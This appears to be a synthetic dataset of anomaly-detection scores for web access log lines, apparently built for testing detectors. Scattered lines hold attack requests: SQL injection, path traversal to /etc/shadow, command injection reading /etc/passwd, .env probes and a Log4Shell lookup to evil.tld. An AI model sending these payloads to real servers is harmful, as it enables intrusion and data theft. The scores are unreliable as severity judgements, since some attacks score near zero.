score_content,score_session,score_fused,score_fused_norm,line
24.80328369140625,,24.80328369140625,24.80328369140625,240.22.54.176 - - [10/Jan/2025:12:27:17 +0000] "GET /api/product?id=123 HTTP/1.1" 200 18886 "https://news.ycombinator.com/" "python-requests/2.31.0"
27.69346809387207,,27.69346809387207,27.69346809387207,140.207.88.61 - - [10/Jan/2025:12:27:20 +0000] "POST /api/product?id=123 HTTP/1.1" 200 19964 "https://example.com/" "dirb/2.22"
73.41303253173828,,73.41303253173828,73.41303253173828,177.114.243.58 - - [10/Jan/2025:12:27:20 +0000] "OPTIONS /profile HTTP/1.1" 200 9712 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30194.10546875,,30194.10546875,30194.10546875,19.132.170.88 - - [10/Jan/2025:12:27:22 +0000] "OPTIONS /profile HTTP/1.1" 403 395 "https://twitter.com/" "python-requests/2.31.0"
27.753040313720703,,27.753040313720703,27.753040313720703,18.93.62.212 - - [10/Jan/2025:12:27:22 +0000] "DELETE /about HTTP/1.1" 200 10762 "-" "Wget/1.21.2 (linux-gnu)"
53.30094909667969,,53.30094909667969,53.30094909667969,217.220.155.165 - - [10/Jan/2025:12:27:24 +0000] "DELETE /search?q=phone HTTP/1.1" 301 8018 "https://example.com/" "curl/7.85.0"
11045.7177734375,,11045.7177734375,11045.7177734375,215.99.127.52 - - [10/Jan/2025:12:27:24 +0000] "GET /search?q=%27+OR+1%3D1+-- HTTP/1.1" 502 745 "-" "sqlmap/1.7.2#stable"
13.436331748962402,,13.436331748962402,13.436331748962402,94.115.134.171 - - [10/Jan/2025:12:27:27 +0000] "PUT /admin HTTP/1.1" 200 6896 "https://www.google.com/" "python-requests/2.31.0"
70.61758422851562,,70.61758422851562,70.61758422851562,89.237.48.16 - - [10/Jan/2025:12:27:27 +0000] "HEAD /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 945 "https://example.com/" "curl/7.85.0"
73.50267028808594,,73.50267028808594,73.50267028808594,149.160.32.178 - - [10/Jan/2025:12:27:28 +0000] "OPTIONS /admin HTTP/1.1" 200 16439 "https://www.google.com/" "curl/7.85.0"
96.20999145507812,,96.20999145507812,96.20999145507812,61.41.158.200 - - [10/Jan/2025:12:27:30 +0000] "OPTIONS /search?q=monitor HTTP/1.1" 200 900 "https://twitter.com/" "sqlmap/1.7.2#stable"
50.44662857055664,,50.44662857055664,50.44662857055664,187.206.65.103 - - [10/Jan/2025:12:27:30 +0000] "HEAD /dashboard HTTP/1.1" 302 17780 "https://example.com/" "dirb/2.22"
27.645915985107422,,27.645915985107422,27.645915985107422,94.80.225.83 - - [10/Jan/2025:12:27:30 +0000] "POST /search?q=phone HTTP/1.1" 200 18387 "https://news.ycombinator.com/" "dirb/2.22"
50.505393981933594,,50.505393981933594,50.505393981933594,173.68.116.25 - - [10/Jan/2025:12:27:33 +0000] "DELETE /search?q=router HTTP/1.1" 200 10895 "-" "sqlmap/1.7.2#stable"
7.552114963531494,,7.552114963531494,7.552114963531494,93.81.57.174 - - [10/Jan/2025:12:27:33 +0000] "POST /profile HTTP/1.1" 301 9849 "https://www.google.com/" "dirb/2.22"
3.108833074569702,,3.108833074569702,3.108833074569702,192.99.67.3 - - [10/Jan/2025:12:27:34 +0000] "GET /index.html HTTP/1.1" 302 16722 "https://twitter.com/" "python-requests/2.31.0"
73.35075378417969,,73.35075378417969,73.35075378417969,61.179.47.135 - - [10/Jan/2025:12:27:36 +0000] "OPTIONS /dashboard HTTP/1.1" 200 9669 "https://twitter.com/" "Wget/1.21.2 (linux-gnu)"
127.67086791992188,,127.67086791992188,127.67086791992188,224.141.132.127 - - [10/Jan/2025:12:27:36 +0000] "TRACE /search?q=router HTTP/1.1" 200 8808 "https://news.ycombinator.com/" "nikto/2.5.0"
30194.15625,,30194.15625,30194.15625,21.81.170.182 - - [10/Jan/2025:12:27:39 +0000] "OPTIONS /about HTTP/1.1" 401 135 "-" "python-requests/2.31.0"
30121.91796875,,30121.91796875,30121.91796875,196.168.139.230 - - [10/Jan/2025:12:27:41 +0000] "GET /assets/app.css HTTP/1.1" 400 750 "https://www.google.com/" "nikto/2.5.0"
11023.3681640625,,11023.3681640625,11023.3681640625,246.4.166.7 - - [10/Jan/2025:12:27:44 +0000] "GET / HTTP/1.1" 503 192 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
73.50005340576172,,73.50005340576172,73.50005340576172,43.12.32.25 - - [10/Jan/2025:12:27:45 +0000] "OPTIONS /login HTTP/1.1" 200 15512 "https://example.com/" "sqlmap/1.7.2#stable"
73.50775146484375,,73.50775146484375,73.50775146484375,140.181.141.211 - - [10/Jan/2025:12:27:46 +0000] "OPTIONS /about HTTP/1.1" 200 18323 "https://news.ycombinator.com/" "python-requests/2.31.0"
50.44525146484375,,50.44525146484375,50.44525146484375,35.21.207.14 - - [10/Jan/2025:12:27:49 +0000] "DELETE /search?q=headphones HTTP/1.1" 200 11880 "https://example.com/" "curl/7.85.0"
36.37543869018555,,36.37543869018555,36.37543869018555,136.44.62.134 - - [10/Jan/2025:12:27:52 +0000] "PUT /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/1.1" 204 11033 "https://twitter.com/" "curl/7.85.0"
50.485595703125,,50.485595703125,50.485595703125,254.248.136.205 - - [10/Jan/2025:12:27:53 +0000] "DELETE /search?q=laptop HTTP/1.1" 200 988 "https://twitter.com/" "python-requests/2.31.0"
30191.595703125,,30191.595703125,30191.595703125,239.136.127.133 - - [10/Jan/2025:12:27:54 +0000] "HEAD /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/1.1" 404 918 "https://example.com/" "python-requests/2.31.0"
36.26346206665039,,36.26346206665039,36.26346206665039,108.183.87.61 - - [10/Jan/2025:12:27:57 +0000] "PUT /api/product?id=123 HTTP/1.1" 200 11062 "https://news.ycombinator.com/" "python-requests/2.31.0"
4.729475975036621,,4.729475975036621,4.729475975036621,206.163.117.10 - - [10/Jan/2025:12:27:58 +0000] "GET /api/products HTTP/1.1" 304 240 "https://twitter.com/" "Wget/1.21.2 (linux-gnu)"
70.59282684326172,,70.59282684326172,70.59282684326172,142.97.5.152 - - [10/Jan/2025:12:28:00 +0000] "HEAD /search?q=ssd HTTP/1.1" 204 14620 "https://news.ycombinator.com/" "nikto/2.5.0"
104.853515625,,104.853515625,104.853515625,196.214.252.141 - - [10/Jan/2025:12:28:02 +0000] "TRACE /profile HTTP/1.1" 200 12787 "-" "sqlmap/1.7.2#stable"
0.13419051468372345,,0.13419051468372345,0.13419051468372345,197.122.148.134 - - [10/Jan/2025:12:28:04 +0000] "GET /cgi-bin/test.cgi HTTP/1.1" 204 1328 "https://twitter.com/" "dirb/2.22"
1.8152981996536255,,1.8152981996536255,1.8152981996536255,145.221.177.95 - - [10/Jan/2025:12:28:06 +0000] "GET /dashboard HTTP/1.1" 200 929 "https://twitter.com/" "sqlmap/1.7.2#stable"
24.819643020629883,,24.819643020629883,24.819643020629883,176.240.3.100 - - [10/Jan/2025:12:28:07 +0000] "GET /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 686 "https://example.com/" "python-requests/2.31.0"
0.22031892836093903,,0.22031892836093903,0.22031892836093903,48.6.96.46 - - [10/Jan/2025:12:28:08 +0000] "GET /assets/app.js HTTP/1.1" 200 9592 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
13.385513305664062,,13.385513305664062,13.385513305664062,219.139.68.67 - - [10/Jan/2025:12:28:09 +0000] "PUT /contact HTTP/1.1" 200 12187 "https://twitter.com/" "python-requests/2.31.0"
30126.681640625,,30126.681640625,30126.681640625,90.250.32.160 - - [10/Jan/2025:12:28:10 +0000] "POST /contact HTTP/1.1" 403 1486 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30216.79296875,,30216.79296875,30216.79296875,182.163.192.191 - - [10/Jan/2025:12:28:13 +0000] "OPTIONS /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 403 1117 "https://twitter.com/" "curl/7.85.0"
27.619056701660156,,27.619056701660156,27.619056701660156,229.114.48.118 - - [10/Jan/2025:12:28:15 +0000] "POST /search?q=phone HTTP/1.1" 200 9458 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
3.1322736740112305,,3.1322736740112305,3.1322736740112305,213.58.244.42 - - [10/Jan/2025:12:28:16 +0000] "POST /wp-login.php HTTP/1.1" 200 573 "https://www.google.com/" "curl/7.85.0"
11068.9951171875,,11068.9951171875,11068.9951171875,67.46.82.247 - - [10/Jan/2025:12:28:19 +0000] "HEAD /dashboard HTTP/1.1" 503 1417 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
11025.7646484375,,11025.7646484375,11025.7646484375,1.213.7.30 - - [10/Jan/2025:12:28:19 +0000] "POST /api/products HTTP/1.1" 500 260 "https://twitter.com/" "dirb/2.22"
27.641572952270508,,27.641572952270508,27.641572952270508,29.244.248.119 - - [10/Jan/2025:12:28:19 +0000] "POST /search?q=ssd HTTP/1.1" 200 1997 "https://example.com/" "python-requests/2.31.0"
7.474519729614258,,7.474519729614258,7.474519729614258,14.103.67.235 - - [10/Jan/2025:12:28:22 +0000] "POST /dashboard HTTP/1.1" 301 5606 "https://www.google.com/" "Wget/1.21.2 (linux-gnu)"
36.261932373046875,,36.261932373046875,36.261932373046875,196.64.22.135 - - [10/Jan/2025:12:28:22 +0000] "PUT /search?q=ssd HTTP/1.1" 200 9893 "https://twitter.com/" "sqlmap/1.7.2#stable"
127.68222045898438,,127.68222045898438,127.68222045898438,134.86.79.125 - - [10/Jan/2025:12:28:24 +0000] "TRACE /search?q=laptop HTTP/1.1" 200 12157 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
50.502601623535156,,50.502601623535156,50.502601623535156,94.35.96.24 - - [10/Jan/2025:12:28:25 +0000] "DELETE /search?q=phone HTTP/1.1" 200 4496 "https://news.ycombinator.com/" "curl/7.85.0"
4.986641883850098,,4.986641883850098,4.986641883850098,234.51.38.92 - - [10/Jan/2025:12:28:26 +0000] "GET / HTTP/1.1" 304 7504 "https://twitter.com/" "dirb/2.22"
2.1453826427459717,,2.1453826427459717,2.1453826427459717,177.42.225.26 - - [10/Jan/2025:12:28:26 +0000] "GET / HTTP/1.1" 200 4824 "-" "sqlmap/1.7.2#stable"
30194.033203125,,30194.033203125,30194.033203125,156.61.16.146 - - [10/Jan/2025:12:28:27 +0000] "OPTIONS /api/products HTTP/1.1" 403 135 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
2.9641993045806885,,2.9641993045806885,2.9641993045806885,229.129.36.228 - - [10/Jan/2025:12:28:29 +0000] "GET /assets/app.css HTTP/1.1" 301 8159 "https://twitter.com/" "sqlmap/1.7.2#stable"
27.613269805908203,,27.613269805908203,27.613269805908203,212.101.46.134 - - [10/Jan/2025:12:28:30 +0000] "POST /search?q=camera HTTP/1.1" 200 13939 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
74.43396759033203,,74.43396759033203,74.43396759033203,13.245.154.145 - - [10/Jan/2025:12:28:33 +0000] "OPTIONS /cgi-bin/test.cgi HTTP/1.1" 301 2307 "https://www.google.com/" "sqlmap/1.7.2#stable"
2.9977760314941406,,2.9977760314941406,2.9977760314941406,1.24.46.38 - - [10/Jan/2025:12:28:35 +0000] "GET /assets/app.css HTTP/1.1" 302 12188 "https://example.com/" "nikto/2.5.0"
0.24439002573490143,,0.24439002573490143,0.24439002573490143,231.90.73.98 - - [10/Jan/2025:12:28:36 +0000] "GET /assets/app.js HTTP/1.1" 200 17518 "https://example.com/" "dirb/2.22"
27.525022506713867,,27.525022506713867,27.525022506713867,27.28.103.110 - - [10/Jan/2025:12:28:37 +0000] "GET /api/product?id=123 HTTP/1.1" 301 1575 "https://www.google.com/" "dirb/2.22"
127.77629852294922,,127.77629852294922,127.77629852294922,130.235.168.18 - - [10/Jan/2025:12:28:39 +0000] "TRACE /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 5486 "-" "sqlmap/1.7.2#stable"
50.52827072143555,,50.52827072143555,50.52827072143555,53.176.117.162 - - [10/Jan/2025:12:28:41 +0000] "DELETE /search?q=camera HTTP/1.1" 200 18696 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
1.9393008947372437,,1.9393008947372437,1.9393008947372437,85.32.24.110 - - [10/Jan/2025:12:28:44 +0000] "GET /logout HTTP/1.1" 200 14011 "https://news.ycombinator.com/" "curl/7.85.0"
7.657423496246338,,7.657423496246338,7.657423496246338,162.200.186.94 - - [10/Jan/2025:12:28:46 +0000] "POST /login HTTP/1.1" 304 2454 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
47.74270248413086,,47.74270248413086,47.74270248413086,131.252.101.106 - - [10/Jan/2025:12:28:49 +0000] "HEAD /admin HTTP/1.1" 200 4779 "https://news.ycombinator.com/" "nikto/2.5.0"
3.0218260288238525,,3.0218260288238525,3.0218260288238525,190.208.232.114 - - [10/Jan/2025:12:28:51 +0000] "GET /assets/app.js HTTP/1.1" 302 12875 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
4.715854167938232,,4.715854167938232,4.715854167938232,242.157.6.202 - - [10/Jan/2025:12:28:52 +0000] "POST /phpmyadmin HTTP/1.1" 200 18272 "-" "curl/7.85.0"
73.39887237548828,,73.39887237548828,73.39887237548828,44.213.230.167 - - [10/Jan/2025:12:28:54 +0000] "OPTIONS /api/products HTTP/1.1" 204 16504 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.9163329601287842,,1.9163329601287842,1.9163329601287842,172.48.99.105 - - [10/Jan/2025:12:28:56 +0000] "GET /logout HTTP/1.1" 200 751 "https://news.ycombinator.com/" "python-requests/2.31.0"
0.48086661100387573,,0.48086661100387573,0.48086661100387573,79.179.212.145 - - [10/Jan/2025:12:28:59 +0000] "GET /.env HTTP/1.1" 200 6127 "-" "curl/7.85.0"
96.22021484375,,96.22021484375,96.22021484375,251.150.122.184 - - [10/Jan/2025:12:29:02 +0000] "OPTIONS /search?q=laptop HTTP/1.1" 200 3296 "-" "curl/7.85.0"
24.696863174438477,,24.696863174438477,24.696863174438477,222.120.156.112 - - [10/Jan/2025:12:29:03 +0000] "GET /search?q=router HTTP/1.1" 200 5370 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
104.89323425292969,,104.89323425292969,104.89323425292969,33.37.231.234 - - [10/Jan/2025:12:29:04 +0000] "TRACE /about HTTP/1.1" 200 4434 "https://www.google.com/" "python-requests/2.31.0"
73.41096496582031,,73.41096496582031,73.41096496582031,217.208.119.175 - - [10/Jan/2025:12:29:04 +0000] "OPTIONS /contact HTTP/1.1" 200 9117 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
36.2697639465332,,36.2697639465332,36.2697639465332,182.145.40.3 - - [10/Jan/2025:12:29:05 +0000] "PUT /search?q=ssd HTTP/1.1" 200 12279 "https://news.ycombinator.com/" "dirb/2.22"
73.40656280517578,,73.40656280517578,73.40656280517578,134.11.59.161 - - [10/Jan/2025:12:29:05 +0000] "HEAD /search?q=ssd HTTP/1.1" 302 13918 "https://news.ycombinator.com/" "nikto/2.5.0"
30.461427688598633,,30.461427688598633,30.461427688598633,207.246.203.39 - - [10/Jan/2025:12:29:08 +0000] "DELETE /api/products HTTP/1.1" 302 15219 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
96.25105285644531,,96.25105285644531,96.25105285644531,47.4.23.237 - - [10/Jan/2025:12:29:08 +0000] "OPTIONS /search?q=laptop HTTP/1.1" 200 12039 "https://twitter.com/" "Wget/1.21.2 (linux-gnu)"
70.57465362548828,,70.57465362548828,70.57465362548828,74.111.83.242 - - [10/Jan/2025:12:29:08 +0000] "HEAD /search?q=ssd HTTP/1.1" 200 7486 "-" "Wget/1.21.2 (linux-gnu)"
24.740598678588867,,24.740598678588867,24.740598678588867,239.181.50.1 - - [10/Jan/2025:12:29:08 +0000] "GET /search?q=phone HTTP/1.1" 200 12094 "https://news.ycombinator.com/" "python-requests/2.31.0"
30146.7578125,,30146.7578125,30146.7578125,103.242.109.145 - - [10/Jan/2025:12:29:11 +0000] "GET /api/backup?file=../../../../etc/shadow HTTP/1.1" 401 1293 "https://twitter.com/" "nikto/2.5.0"
3.052366018295288,,3.052366018295288,3.052366018295288,203.140.35.109 - - [10/Jan/2025:12:29:13 +0000] "GET /assets/app.css HTTP/1.1" 304 16963 "https://twitter.com/" "Wget/1.21.2 (linux-gnu)"
0.21391062438488007,,0.21391062438488007,0.21391062438488007,247.232.150.69 - - [10/Jan/2025:12:29:16 +0000] "GET /assets/app.css HTTP/1.1" 200 14467 "https://example.com/" "sqlmap/1.7.2#stable"
4.734060287475586,,4.734060287475586,4.734060287475586,222.103.42.79 - - [10/Jan/2025:12:29:19 +0000] "POST /api/products HTTP/1.1" 200 1089 "https://example.com/" "python-requests/2.31.0"
3.0821409225463867,,3.0821409225463867,3.0821409225463867,235.78.159.128 - - [10/Jan/2025:12:29:20 +0000] "GET /assets/app.js HTTP/1.1" 304 19977 "https://www.google.com/" "Wget/1.21.2 (linux-gnu)"
103.22949981689453,,103.22949981689453,103.22949981689453,104.64.113.158 - - [10/Jan/2025:12:29:23 +0000] "TRACE /.git/config HTTP/1.1" 200 11267 "https://twitter.com/" "sqlmap/1.7.2#stable"
36.172115325927734,,36.172115325927734,36.172115325927734,24.132.120.119 - - [10/Jan/2025:12:29:24 +0000] "PUT /search?q=router HTTP/1.1" 200 2335 "https://twitter.com/" "sqlmap/1.7.2#stable"
0.1690119057893753,,0.1690119057893753,0.1690119057893753,196.35.48.254 - - [10/Jan/2025:12:29:27 +0000] "GET /../../etc/passwd HTTP/1.1" 201 13006 "https://www.google.com/" "dirb/2.22"
30.489757537841797,,30.489757537841797,30.489757537841797,57.112.231.252 - - [10/Jan/2025:12:29:29 +0000] "DELETE /profile HTTP/1.1" 302 14933 "https://news.ycombinator.com/" "curl/7.85.0"
39.11249542236328,,39.11249542236328,39.11249542236328,75.144.124.22 - - [10/Jan/2025:12:29:29 +0000] "PUT /api/user?id=1;DROP TABLE users HTTP/1.1" 304 14085 "https://news.ycombinator.com/" "curl/7.85.0"
13.434366226196289,,13.434366226196289,13.434366226196289,106.178.201.205 - - [10/Jan/2025:12:29:29 +0000] "PUT /login HTTP/1.1" 200 6365 "https://example.com/" "curl/7.85.0"
4.780456066131592,,4.780456066131592,4.780456066131592,36.254.182.156 - - [10/Jan/2025:12:29:30 +0000] "POST /contact HTTP/1.1" 200 9514 "https://news.ycombinator.com/" "nikto/2.5.0"
47.71548080444336,,47.71548080444336,47.71548080444336,18.82.85.177 - - [10/Jan/2025:12:29:31 +0000] "HEAD /logout HTTP/1.1" 200 6979 "https://twitter.com/" "sqlmap/1.7.2#stable"
27.72820281982422,,27.72820281982422,27.72820281982422,15.146.106.161 - - [10/Jan/2025:12:29:32 +0000] "DELETE /login HTTP/1.1" 204 5387 "https://example.com/" "curl/7.85.0"
5.899266242980957,,5.899266242980957,5.899266242980957,97.139.36.128 - - [10/Jan/2025:12:29:32 +0000] "POST /cgi-bin/test.cgi HTTP/1.1" 304 15579 "https://example.com/" "nikto/2.5.0"
1.9369510412216187,,1.9369510412216187,1.9369510412216187,111.192.52.101 - - [10/Jan/2025:12:29:32 +0000] "GET /logout HTTP/1.1" 200 13233 "-" "python-requests/2.31.0"
50.46394348144531,,50.46394348144531,50.46394348144531,120.25.29.213 - - [10/Jan/2025:12:29:32 +0000] "DELETE /search?q=monitor HTTP/1.1" 200 4434 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
96.20976257324219,,96.20976257324219,96.20976257324219,236.188.227.29 - - [10/Jan/2025:12:29:33 +0000] "OPTIONS /search?q=monitor HTTP/1.1" 200 5596 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
47.701900482177734,,47.701900482177734,47.701900482177734,61.45.54.147 - - [10/Jan/2025:12:29:33 +0000] "HEAD /logout HTTP/1.1" 200 1813 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30.53997230529785,,30.53997230529785,30.53997230529785,217.102.33.71 - - [10/Jan/2025:12:29:33 +0000] "DELETE /login HTTP/1.1" 301 15365 "https://example.com/" "sqlmap/1.7.2#stable"
5.0165019035339355,,5.0165019035339355,5.0165019035339355,45.224.185.247 - - [10/Jan/2025:12:29:36 +0000] "GET / HTTP/1.1" 304 16920 "https://example.com/" "python-requests/2.31.0"
24.7345027923584,,24.7345027923584,24.7345027923584,196.27.251.128 - - [10/Jan/2025:12:29:38 +0000] "GET /search?q=phone HTTP/1.1" 200 10234 "https://example.com/" "sqlmap/1.7.2#stable"
0.49880269169807434,,0.49880269169807434,0.49880269169807434,236.16.65.91 - - [10/Jan/2025:12:29:39 +0000] "GET /.env HTTP/1.1" 200 11230 "https://example.com/" "python-requests/2.31.0"
50.524173736572266,,50.524173736572266,50.524173736572266,24.38.7.173 - - [10/Jan/2025:12:29:42 +0000] "DELETE /search?q=camera HTTP/1.1" 200 17155 "https://twitter.com/" "python-requests/2.31.0"
2.148829936981201,,2.148829936981201,2.148829936981201,200.100.26.214 - - [10/Jan/2025:12:29:45 +0000] "GET / HTTP/1.1" 200 5776 "-" "sqlmap/1.7.2#stable"
2.1882753372192383,,2.1882753372192383,2.1882753372192383,70.155.80.238 - - [10/Jan/2025:12:29:47 +0000] "GET / HTTP/1.1" 200 18121 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
73.46741485595703,,73.46741485595703,73.46741485595703,31.131.243.81 - - [10/Jan/2025:12:29:47 +0000] "OPTIONS /about HTTP/1.1" 200 934 "https://example.com/" "python-requests/2.31.0"
30123.25,,30123.25,30123.25,188.157.227.229 - - [10/Jan/2025:12:29:47 +0000] "GET /assets/app.js HTTP/1.1" 429 437 "https://twitter.com/" "nikto/2.5.0"
0.21088849008083344,,0.21088849008083344,0.21088849008083344,237.112.104.250 - - [10/Jan/2025:12:29:49 +0000] "GET /assets/app.css HTTP/1.1" 200 13455 "https://news.ycombinator.com/" "nikto/2.5.0"
1.9058581590652466,,1.9058581590652466,1.9058581590652466,220.87.186.55 - - [10/Jan/2025:12:29:50 +0000] "GET /contact HTTP/1.1" 200 14093 "https://www.google.com/" "curl/7.85.0"
